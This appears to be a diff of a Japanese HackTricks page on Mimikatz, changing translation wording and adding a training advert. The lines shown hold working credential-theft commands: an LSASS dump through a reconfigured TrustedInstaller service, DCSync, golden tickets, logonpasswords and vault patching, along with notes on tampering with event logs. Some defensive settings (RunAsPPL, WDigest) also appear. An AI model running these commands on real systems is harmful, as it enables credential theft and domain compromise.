@@ -15,23 +15,30 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+
+{% embed url="https://academy.8ksec.io/" %}
+
+
 **このページは [adsecurity.org](https://adsecurity.org/?page\_id=1821) のものに基づいています**。詳細については元のページを確認してください！
 
 ## LM とメモリ内の平文
 
 Windows 8.1 および Windows Server 2012 R2 以降、資格情報の盗難を防ぐために重要な対策が実施されています：
 
-- **LM ハッシュと平文のパスワード**は、セキュリティを強化するためにメモリに保存されなくなりました。特定のレジストリ設定、_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ を DWORD 値 `0` に設定してダイジェスト認証を無効にし、「平文」パスワードが LSASS にキャッシュされないようにする必要があります。
+- **LM ハッシュと平文パスワード**は、セキュリティを強化するためにメモリに保存されなくなりました。特定のレジストリ設定、_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ を DWORD 値 `0` に設定してダイジェスト認証を無効にし、「平文」パスワードが LSASS にキャッシュされないようにする必要があります。
 
-- **LSA 保護**は、ローカル セキュリティ機関 (LSA) プロセスを不正なメモリ読み取りやコード注入から保護するために導入されました。これは、LSASS を保護されたプロセスとしてマークすることで実現されます。LSA 保護を有効にするには：
+- **LSA 保護**は、ローカル セキュリティ アuthority (LSA) プロセスを不正なメモリ読み取りやコード注入から保護するために導入されました。これは、LSASS を保護されたプロセスとしてマークすることによって実現されます。LSA 保護を有効にするには：
 1. _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ のレジストリを変更し、`RunAsPPL` を `dword:00000001` に設定します。
-2. このレジストリ変更を管理対象デバイス全体に強制するグループ ポリシー オブジェクト (GPO) を実装します。
+2. 管理されたデバイス全体でこのレジストリ変更を強制するグループ ポリシー オブジェクト (GPO) を実装します。
 
-これらの保護にもかかわらず、Mimikatz のようなツールは特定のドライバーを使用して LSA 保護を回避できますが、そのような行動はイベントログに記録される可能性が高いです。
+これらの保護にもかかわらず、Mimikatz のようなツールは特定のドライバーを使用して LSA 保護を回避することができますが、そのような行動はイベントログに記録される可能性が高いです。
 
-### SeDebugPrivilege 削除への対抗策
+### SeDebugPrivilege 削除への対抗
 
-管理者は通常、プログラムをデバッグするための SeDebugPrivilege を持っています。この特権は、不正なメモリダンプを防ぐために制限されることがあります。これは、攻撃者がメモリから資格情報を抽出するために使用する一般的な手法です。しかし、この特権が削除されても、TrustedInstaller アカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行できます：
+管理者は通常 SeDebugPrivilege を持っており、プログラムをデバッグすることができます。この特権は、不正なメモリダンプを防ぐために制限されることがあり、これは攻撃者がメモリから資格情報を抽出するために使用する一般的な手法です。しかし、この特権が削除されても、TrustedInstaller アカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行できます：
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -49,7 +56,7 @@ Mimikatzにおけるイベントログの改ざんは、主に2つのアクシ�
 #### Clearing Event Logs
 
 - **Command**: このアクションは、イベントログを削除することを目的としており、悪意のある活動を追跡することを難しくします。
-- Mimikatzは、コマンドラインを介してイベントログを直接クリアするための直接的なコマンドを標準のドキュメントには提供していません。しかし、イベントログの操作は通常、特定のログをクリアするためにMimikatzの外部でシステムツールやスクリプトを使用することを含みます（例：PowerShellやWindows Event Viewerを使用）。
+- Mimikatzは、コマンドラインを介してイベントログを直接クリアするための直接的なコマンドを標準ドキュメントに提供していません。しかし、イベントログの操作は通常、特定のログをクリアするためにMimikatzの外部でシステムツールやスクリプトを使用することを含みます（例：PowerShellやWindows Event Viewerを使用）。
 
 #### Experimental Feature: Patching the Event Service
 
@@ -135,9 +142,9 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **DCSync**: DCを模倣してパスワードデータを要求します。
 - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### 認証情報アクセス
+### 資格情報アクセス
 
-- **LSADUMP::LSA**: LSAから認証情報を抽出します。
+- **LSADUMP::LSA**: LSAから資格情報を抽出します。
 - `mimikatz "lsadump::lsa /inject" exit`
 
 - **LSADUMP::NetSync**: コンピュータアカウントのパスワードデータを使用してDCを偽装します。
@@ -168,9 +175,9 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **PRIVILEGE::Debug**: デバッグ権限を取得します。
 - `mimikatz "privilege::debug" exit`
 
-### 認証情報ダンプ
+### 資格情報ダンプ
 
-- **SEKURLSA::LogonPasswords**: ログイン中のユーザーの認証情報を表示します。
+- **SEKURLSA::LogonPasswords**: ログオン中のユーザーの資格情報を表示します。
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
 - **SEKURLSA::Tickets**: メモリからKerberosチケットを抽出します。
@@ -199,9 +206,15 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - `mimikatz "vault::cred /patch" exit`
 
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+**モバイルセキュリティ**の専門知識を深めるために8kSecアカデミーをご利用ください。自己ペースのコースを通じてiOSとAndroidのセキュリティをマスターし、認定を取得しましょう：
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
-AWSハッキングを学び、練習する:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、練習する: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
